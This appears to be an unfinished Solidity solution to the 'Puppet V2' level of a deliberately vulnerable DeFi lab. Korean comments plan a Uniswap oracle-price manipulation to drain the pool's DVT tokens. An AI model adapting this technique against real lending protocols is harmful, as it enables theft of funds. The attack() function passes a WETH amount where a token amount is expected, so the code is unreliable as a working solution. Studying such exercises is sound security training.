// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";

interface IPuppetV2Pool {
    function borrow(uint256 borrowAmount) external;

    function calculateDepositOfWETHRequired(uint256 tokenAmount) external view returns (uint256);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    function balanceOf(address account) external returns (uint256);
}

contract PuppetV2Exploit {
    IPuppetV2Pool public _puppetV2Pool;
    address private _uniswapPair;
    address private _uniswapFactory;
    IERC20 private _token;

    constructor(address puppetV2Pool, address tokenAddress, address uniswapPairAddress, address uniswapFactoryAddress) public {
        _puppetV2Pool = IPuppetV2Pool(puppetV2Pool);
        _token = IERC20(tokenAddress);
        _uniswapPair = uniswapPairAddress;
        _uniswapFactory = uniswapFactoryAddress;
    }

    /**
    지금 보면 pair에 유동성이 10WETH 100DVT가 들어있음.

    calculateDepositOfWETHRequired(1) => 0.3 이 나옴 
    borrow( 100 ) => weth를 30개 보내야함. 

    attacker 에는 10,000 DVT 
    puppetV2Pool 에는 1,000,000 DVT 가 있음. 

    pool에있는 1,000,000 DVT 빼서 attacker에게 보내야함. 

    attacker에 있는 10,000DVT를 ETH로 다 스왑했음. 
    attacker에 29.899338949705776239 ETH가 있음. 

     calculateDepositOfWETHRequired(1) => 0.00029496494833197가 나옴. 


     */

    function ExgetAmountsOut(address factory, uint amountIn, address[] calldata path) external view returns (uint[] memory) {
        uint[] memory amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path);
        return amounts;
    }

    function attack() external payable {
        uint256 millionDVTBalance = _token.balanceOf((address(_puppetV2Pool)));

        uint256 returnAmount = _puppetV2Pool.calculateDepositOfWETHRequired(millionDVTBalance);

        _puppetV2Pool.borrow(returnAmount);
        // 이걸 하기위해서
        //  29.496494833197321980 WETH이 exploit컨트랙트 안에 있어야함 .
    }
}
